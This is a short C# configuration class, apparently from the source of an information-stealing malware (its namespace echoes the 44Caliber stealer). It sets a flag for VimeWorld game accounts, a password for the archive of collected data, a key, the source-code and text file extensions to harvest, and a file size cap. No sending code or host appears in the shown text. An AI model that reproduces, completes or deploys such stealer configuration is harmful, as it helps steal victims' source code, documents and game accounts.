namespace youknowcaliber
{
    class Config
    {
        public static readonly bool VimeWorld = true;

        public static string zipPass = "pegasus";


        public static string key = "p.e.g.a.s.u.s";

        public static string[] extensions = new string[]
        {
          ".csproj",".sln",".cs",".txt"
        };

        //  5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static int sizefile = 63000000;
    }
}
